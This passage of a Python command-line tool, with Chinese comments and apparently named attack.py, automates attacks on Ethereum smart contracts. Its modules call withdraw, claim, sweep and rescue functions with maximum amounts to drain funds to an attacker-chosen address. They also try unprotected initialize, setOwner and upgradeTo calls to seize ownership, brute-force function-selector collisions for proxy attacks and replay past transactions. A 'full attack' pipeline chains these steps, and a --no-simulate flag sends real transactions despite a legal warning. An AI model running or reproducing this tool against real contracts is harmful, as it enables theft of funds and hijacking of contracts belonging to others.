                      else f"\n  发现 {len(hit)} 个可利用函数")
        for h in hit:
            console.print(f"    • {h['sig']}  calldata={h['calldata'][:40]}...")
    else:
        console.print(f"\n  ✅ 未发现可利用函数（所有高危函数均有权限保护）")
    return hit



# ==============================================================================
# 模块 4：drain —— 尝试调用提款类函数
# ==============================================================================
def do_drain(w3, target, account, to_addr, token=None, simulate=True, recon_result=None):
    addr = to_checksum_address(target)
    _to = to_checksum_address(to_addr)
    if not recon_result:
        recon_result = do_recon(w3, target, verbose=False)

    console.print(f"\n[bold red]💸 Drain 尝试: {addr} → {_to}[/bold red]" if HAS_RICH
                  else f"\nDrain: {addr} → {_to}")

    eth_bal = recon_result.get("balance_eth", 0)
    if eth_bal > 0:
        console.print(f"  目标 ETH 余额: {eth_bal:.4f} ETH")

    drain_sigs = [
        ("withdraw()",                       b"", 0),
        ("withdraw(uint256)",                _encode_uint(2**256-1), 0),
        ("withdraw(address,uint256)",        _encode_addr_uint(_to, 2**256-1), 0),
        ("emergencyWithdraw()",              b"", 0),
        ("claim()",                          b"", 0),
        ("claimRewards()",                   b"", 0),
        ("claimReward()",                    b"", 0),
        ("harvest()",                        b"", 0),
        ("getReward()",                      b"", 0),
        ("rescueTokens(address,uint256)",    _encode_addr_uint(_to, 2**256-1), 0),
        ("sweep(address)",                   _encode_addr(_to), 0),
    ]
    if token:
        tok = to_checksum_address(token)
        drain_sigs.append(("rescueERC20(address,address,uint256)",
                           _encode_addr_addr_uint(tok, _to, 2**256-1), 0))

    hit = []
    for sig, extra_params, value in drain_sigs:
        s = sel4(sig)
        has_it = any(f["selector"] == s for f in recon_result["functions"])
        if not has_it:
            continue

        calldata = bytes.fromhex(s[2:]) + extra_params
        console.print(f"\n  → 尝试 {sig}")
        if account:
            rcpt = build_and_send(w3, account, addr, calldata, value=value, simulate=simulate)
            if rcpt:
                hit.append(sig)
        else:
            try:
                ret = eth_call(w3, addr, calldata)
                console.print(f"    eth_call OK，返回: 0x{ret.hex()[:32]}...")
                hit.append(sig)
            except Exception as e:
                console.print(f"    失败: {str(e)[:80]}")

    console.print(f"\n  结果：{'发现 '+str(len(hit))+' 个可调通' if hit else '全部 revert 或不存在'}")
    return hit


def _encode_uint(n):
    from eth_abi import encode
    return encode(["uint256"], [n])

def _encode_addr(a):
    from eth_abi import encode
    return encode(["address"], [to_checksum_address(a)])

def _encode_addr_uint(a, n):
    from eth_abi import encode
    return encode(["address","uint256"], [to_checksum_address(a), n])

def _encode_addr_addr_uint(a, b, n):
    from eth_abi import encode
    return encode(["address","address","uint256"],
                  [to_checksum_address(a), to_checksum_address(b), n])


# ==============================================================================
# 模块 5：takeover —— 检测权限接管漏洞
# ==============================================================================
def do_takeover(w3, target, account=None, simulate=True, recon_result=None):
    addr = to_checksum_address(target)
    attacker = account.address if account else None
    if not recon_result:
        recon_result = do_recon(w3, target, verbose=False)

    console.print(f"\n[bold red]👑 Takeover 检测: {addr}[/bold red]" if HAS_RICH
                  else f"\nTakeover 检测: {addr}")

    vulnerable = []
    takeover_tests = [
        ("initialize()",           lambda: b"",
         "re-initialize（如无权限保护→劫持 owner）"),
        ("initialize(address)",    lambda: _encode_addr(attacker or "0x"+"1"*40),
         "initialize(attacker)"),
        ("transferOwnership(address)", lambda: _encode_addr(attacker or "0x"+"1"*40),
         "transferOwnership 无权限保护"),
        ("setOwner(address)",      lambda: _encode_addr(attacker or "0x"+"1"*40),
         "setOwner 无权限保护"),
        ("setAdmin(address)",      lambda: _encode_addr(attacker or "0x"+"1"*40),
         "setAdmin 无权限保护"),
        ("upgradeTo(address)",     lambda: _encode_addr(attacker or "0x"+"1"*40),
         "upgradeTo 未保护"),
    ]

    for sig, param_fn, desc in takeover_tests:
        s = sel4(sig)
        has_it = any(f["selector"] == s for f in recon_result["functions"])
        if not has_it:
            continue

        params = param_fn()
        calldata = bytes.fromhex(s[2:]) + params
        console.print(f"\n  → 检测 {sig}  ({desc})")
        try:
            ret = eth_call(w3, addr, calldata, sender=attacker)
            console.print(f"  💥 [bold red]漏洞！eth_call 成功！[/bold red] 返回: 0x{ret.hex()[:32]}"
                          if HAS_RICH else f"  !! 漏洞：{sig}")
            vulnerable.append({"sig": sig, "desc": desc, "calldata": "0x"+calldata.hex()})
            if not simulate and account:
                build_and_send(w3, account, addr, calldata, simulate=False)
        except Exception as e:
            msg = str(e).lower()
            if "revert" in msg or "execution" in msg:
                console.print(f"  ✅ {sig} → 有保护，revert")
            else:
                console.print(f"  ❓ {sig} → {str(e)[:80]}")

    if vulnerable:
        console.print(f"\n  🚨 [bold red]发现 {len(vulnerable)} 个接管漏洞！[/bold red]" if HAS_RICH
                      else f"\n  发现 {len(vulnerable)} 个接管漏洞")
        for v in vulnerable:
            console.print(f"    • {v['sig']}  {v['desc']}")
    else:
        console.print(f"\n  ✅ 未发现接管漏洞（权限函数均有保护）")
    return vulnerable



# ==============================================================================
# 模块 6：selector —— 选择器碰撞构造
# ==============================================================================
def do_selector(target_selector, target_name=None, templates=None, max_iter=3_000_000, count=3):
    import itertools, string

    target = target_selector.lower().removeprefix("0x")
    if len(target) != 8:
        console.print("[red]❌ selector 必须是 8 位 hex（4 字节）[/red]")
        sys.exit(1)
    target_bytes = bytes.fromhex(target)

    tpls = [t.strip() for t in (templates or "init,upgrade,setOwner,collect,exec,grant").split(",")]
    params_sets = ["", "address", "uint256", "address,uint256", "bytes"]

    console.print(f"\n💥 选择器碰撞爆破 → 0x{target}")
    console.print(f"   函数名前缀模板: {tpls}")
    console.print(f"   最大尝试: {max_iter:,}\n")

    chars = string.ascii_lowercase + string.digits
    found = []

    for suffix_len in range(1, 10):
        if len(found) >= count:
            break
        for suffix_tuple in itertools.product(chars, repeat=suffix_len):
            suffix = "".join(suffix_tuple)
            for tpl in tpls:
                for params in params_sets:
                    candidate = f"{tpl}_{suffix}({params})"
                    if keccak(text=candidate)[:4] == target_bytes:
                        console.print(f"  ✅ 找到碰撞：[green bold]{candidate}[/green bold]" if HAS_RICH
                                      else f"  !! 碰撞: {candidate}")
                        found.append(candidate)
                        if len(found) >= count:
                            break
            if len(found) >= count:
                break
            max_iter -= 1
            if max_iter <= 0:
                break
        if max_iter <= 0:
            console.print("  ⏰ 达到最大尝试次数")
            break

    if not found:
        console.print("  未找到，增大 --max 或更换模板")
    else:
        console.print(f"\n  共找到 {len(found)} 个碰撞签名，可用于代理合约 Audius-style 攻击测试")

    if target_name:
        actual_sel = "0x" + keccak(text=target_name)[:4].hex()
        console.print(f"\n  目标函数 {target_name} 的真实 selector = {actual_sel}")
    return found


# ==============================================================================
# 模块 7：replay —— 历史交易重放
# ==============================================================================
def do_replay(w3, tx_hash, account, target=None, simulate=True):
    console.print(f"\n🔄 重放交易: {tx_hash}")
    try:
        tx = w3.eth.get_transaction(tx_hash)
    except Exception as e:
        console.print(f"[red]❌ 获取交易失败：{e}[/red]")
        return

    to = target or tx["to"]
    calldata = tx["input"] if isinstance(tx["input"], bytes) \
               else bytes.fromhex(tx["input"].removeprefix("0x"))
    value = tx.get("value", 0)

    console.print(f"  原 from:    {tx['from']}")
    console.print(f"  to:        {to}")
    console.print(f"  calldata:  0x{calldata.hex()[:64]}...")
    console.print(f"  value:     {w3.from_wei(value, 'ether')} ETH")

    sel = "0x" + calldata[:4].hex()
    sigs = lookup_sig(sel)
    if sigs:
        console.print(f"  函数:      {sigs[0]}")

    if account:
        build_and_send(w3, account, to, calldata, value=value, simulate=simulate)
    else:
        console.print("  [yellow]未提供私钥，仅解析不重放[/yellow]" if HAS_RICH
                      else "  未提供私钥，仅解析")


# ==============================================================================
# 模块 8：full —— 一条龙
# ==============================================================================
def do_full(w3, target, account, to_addr=None, token=None, simulate=True):
    console.print("\n" + ("="*70))
    console.print("🚀 [bold red]攻击一条龙开始[/bold red]" if HAS_RICH else "攻击一条龙开始")
    console.print("="*70)

    console.print("\n[bold]📡 Step 1/5: 侦察[/bold]" if HAS_RICH else "\nStep 1/5: 侦察")
    recon = do_recon(w3, target, verbose=True)

    console.print("\n[bold]🔍 Step 2/5: 探针[/bold]" if HAS_RICH else "\nStep 2/5: 探针")
    sender = account.address if account else None
    probe_result = do_probe(w3, target, recon_result=recon, sender=sender)

    console.print("\n[bold]⚔️  Step 3/5: Sweep 参数穷举[/bold]" if HAS_RICH else "\nStep 3/5: Sweep")
    sweep_result = do_sweep(w3, target, account, recon_result=recon,
                            simulate=simulate, to_addr=to_addr)

    console.print("\n[bold]💸 Step 4/5: Drain 提款[/bold]" if HAS_RICH else "\nStep 4/5: Drain")
    drain_result = do_drain(w3, target, account,
                            to_addr=to_addr or (account.address if account else "0x0"),
                            token=token, simulate=simulate, recon_result=recon)

    console.print("\n[bold]👑 Step 5/5: Takeover 接管检测[/bold]" if HAS_RICH else "\nStep 5/5: Takeover")
    takeover_result = do_takeover(w3, target, account, simulate=simulate, recon_result=recon)

    console.print("\n" + ("="*70))
    console.print("[bold]📊 攻击一条龙汇总[/bold]" if HAS_RICH else "攻击汇总")
    console.print("="*70)
    console.print(f"  目标合约:    {target}")
    console.print(f"  ETH 余额:   {recon.get('balance_eth',0):.4f} ETH")
    console.print(f"  函数总数:   {len(recon['functions'])}")
    console.print(f"  RED 函数:   {sum(1 for f in recon['functions'] if f['danger']=='RED')}")
    console.print(f"  ORANGE 函数: {sum(1 for f in recon['functions'] if f['danger']=='ORANGE')}")
    console.print(f"  可调通:     {sum(1 for p in probe_result if p.get('status')=='ok')}")
    console.print(f"  Sweep 命中: {len(sweep_result)}")
    console.print(f"  Drain 命中: {len(drain_result)}")
    console.print(f"  接管漏洞:   {len(takeover_result)}")

    total_vuln = len(sweep_result) + len(drain_result) + len(takeover_result)
    if total_vuln > 0:
        console.print(f"\n  🚨 [bold red]共发现 {total_vuln} 个可利用点！[/bold red]" if HAS_RICH
                      else f"\n  发现 {total_vuln} 个可利用点")
        if simulate:
            console.print("  🛑 当前为 --simulate 模式，去掉该参数可真实执行")
    else:
        console.print("\n  ✅ 目标合约未发现明显漏洞（不代表完全安全）")

    return {"recon": recon, "probe": probe_result,
            "sweep": sweep_result, "drain": drain_result, "takeover": takeover_result}



# ==============================================================================
# CLI 入口
# ==============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="合约攻击模拟一条龙工具（仅限合法安全测试）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  LEGAL WARNING: 仅用于自己合约或经授权的安全测试！

示例：
  # 侦察目标合约（自动包含 pyevmasm 参数推断）
  attack.py recon 0xTarget --rpc https://...

  # 反编译字节码（同时使用 pyevmasm + panoramix）
  attack.py decompile 0xTarget --rpc https://... --backend both

  # 仅 panoramix 高层反编译
  attack.py decompile 0xTarget --chain arb --backend panoramix

  # 仅 pyevmasm 反汇编分析
  attack.py decompile 0xTarget --chain arb --backend evmasm

  # 探针扫描
  attack.py probe 0xTarget --chain arb

  # Sweep 模拟攻击
  attack.py sweep 0xTarget --chain arb --key $PK --simulate

  # Drain 提款模拟
  attack.py drain 0xTarget --chain arb --key $PK --to 0xMe --simulate

  # Takeover 接管漏洞检测
  attack.py takeover 0xTarget --chain arb --key $PK --simulate

  # 选择器碰撞爆破
  attack.py selector 0xa9059cbb --target-name "initialize(address)"

  # 历史交易重放
  attack.py replay 0xTxHash --chain arb --key $PK --simulate

  # 一条龙（默认 simulate）
  attack.py full 0xTarget --chain arb --key $PK --to 0xMe --simulate

环境变量：
  PRIVATE_KEY     私钥
  RPC_URL         默认 RPC
""",
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    def add_common(p, need_key=False):
        p.add_argument("--rpc", help="自定义 RPC URL")
        p.add_argument("--chain", help=f"预设链: {', '.join(CHAINS.keys())}")
        p.add_argument("--timeout", type=int, default=30)
        if need_key:
            p.add_argument("--key", "-k", help="私钥（或设 PRIVATE_KEY 环境变量）")
            p.add_argument("--simulate", action="store_true", default=True,
                           help="只模拟不发真实交易（默认开启）")
            p.add_argument("--no-simulate", dest="simulate", action="store_false")

    # recon
    p = sub.add_parser("recon", help="侦察：提取函数 + admin/owner + evmasm 参数推断")
    p.add_argument("target")
    add_common(p)

    # decompile（新增）
    p = sub.add_parser("decompile",
                       help="反编译：pyevmasm 反汇编 + panoramix 高层反编译，提取函数与参数")
    p.add_argument("target", help="目标合约地址")
    p.add_argument("--backend", choices=["evmasm", "panoramix", "both"], default="both",
                   help="反编译后端（默认 both）")
    p.add_argument("--decompile-timeout", type=int, default=60,
                   dest="decompile_timeout",
                   help="panoramix 最长等待秒数（默认 60）")
    add_common(p)

    # probe
    p = sub.add_parser("probe", help="探针：批量 eth_call 试探每个函数")
    p.add_argument("target")
    p.add_argument("--sender", help="模拟调用者地址")
    add_common(p)

    # sweep
    p = sub.add_parser("sweep", help="Sweep：对高危函数发起参数穷举模拟攻击")
    p.add_argument("target")
    p.add_argument("--to", dest="to_addr", help="收款地址")
    add_common(p, need_key=True)

    # drain
    p = sub.add_parser("drain", help="Drain：尝试调用 withdraw/claim 类函数")
    p.add_argument("target")
    p.add_argument("--to", dest="to_addr", help="接收地址")
    p.add_argument("--token", help="ERC20 token 地址")
    add_common(p, need_key=True)

    # takeover
    p = sub.add_parser("takeover", help="Takeover：检测权限接管漏洞")
    p.add_argument("target")
    add_common(p, need_key=True)

    # selector
    p = sub.add_parser("selector", help="选择器碰撞：爆破能撞上目标 selector 的函数名")
    p.add_argument("target_selector")
    p.add_argument("--templates", default="init,upgrade,setOwner,collect,exec,grant")
    p.add_argument("--max", type=int, default=3_000_000, dest="max_iter")
    p.add_argument("--count", type=int, default=3)
    p.add_argument("--target-name", help="目标函数真实名字（仅对比展示）")

    # replay
    p = sub.add_parser("replay", help="重放：从历史交易提取 calldata 并重放")
    p.add_argument("tx_hash")
    p.add_argument("--target", help="覆盖 to 地址")
    add_common(p, need_key=True)

    # full
    p = sub.add_parser("full", help="一条龙：recon→probe→sweep→drain→takeover")
    p.add_argument("target")
    p.add_argument("--to", dest="to_addr", help="接收地址")
    p.add_argument("--token", help="ERC20 token 地址")
    add_common(p, need_key=True)

    args = parser.parse_args()

    # selector 不需要 RPC
    if args.cmd == "selector":
        do_selector(args.target_selector, target_name=args.target_name,
                    templates=args.templates, max_iter=args.max_iter, count=args.count)
        return

    # 连接 RPC
    w3, url = get_w3(getattr(args, "rpc", None), getattr(args, "chain", None))
    console.print(f"🌐 已连接 [cyan]{url}[/cyan]  Chain ID: {w3.eth.chain_id}" if HAS_RICH
                  else f"🌐 {url}  Chain {w3.eth.chain_id}")

    account = load_account(args) if hasattr(args, "key") else None
    if account:
        console.print(f"🔑 攻击账户: [cyan]{account.address}[/cyan]" if HAS_RICH
                      else f"攻击账户: {account.address}")

    simulate = getattr(args, "simulate", True)
    if not simulate:
        console.print("[bold red]⚠️  --no-simulate 模式：将发送真实链上交易！[/bold red]" if HAS_RICH
                      else "!! 真实交易模式")
        try:
            confirm = input("确认继续？[yes/no]: ").strip().lower()
            if confirm not in ("yes", "y"):
                sys.exit(0)
        except (EOFError, KeyboardInterrupt):
            sys.exit(0)

    if args.cmd == "recon":
        do_recon(w3, args.target)
    elif args.cmd == "decompile":
        do_decompile(w3, args.target,
                     backend=args.backend,
                     timeout=args.decompile_timeout)
    elif args.cmd == "probe":
        do_probe(w3, args.target, sender=getattr(args, "sender", None))
    elif args.cmd == "sweep":
        do_sweep(w3, args.target, account, simulate=simulate,
                 to_addr=getattr(args, "to_addr", None))
    elif args.cmd == "drain":
        do_drain(w3, args.target, account,
                 to_addr=getattr(args,"to_addr",None) or (account.address if account else "0x0"),
                 token=getattr(args,"token",None), simulate=simulate)
    elif args.cmd == "takeover":
        do_takeover(w3, args.target, account, simulate=simulate)
    elif args.cmd == "replay":
        do_replay(w3, args.tx_hash, account,
                  target=getattr(args,"target",None), simulate=simulate)
    elif args.cmd == "full":
        do_full(w3, args.target, account,
                to_addr=getattr(args,"to_addr",None),
                token=getattr(args,"token",None),
                simulate=simulate)


if __name__ == "__main__":
    main()
